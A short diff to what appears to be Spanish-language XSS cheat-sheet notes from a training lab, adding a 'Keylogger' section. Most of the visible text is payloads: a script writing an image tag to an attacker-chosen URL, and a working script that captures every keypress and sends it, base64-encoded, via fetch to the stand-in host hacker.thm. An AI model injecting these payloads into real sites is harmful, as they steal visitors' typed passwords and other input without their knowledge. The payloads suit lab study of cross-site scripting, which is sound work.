@@ -39,3 +39,7 @@ En una máquina fue útil cuando quisimos que un usuario logueado fuese a una di
 igual que el anterior, pero el codigo:
 <script>document.write('<img src="URL A DONDE QUIERAS DIRIGIR"/>');</script>
 ```
+### Keylogger
+
+``` <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script> ```
+
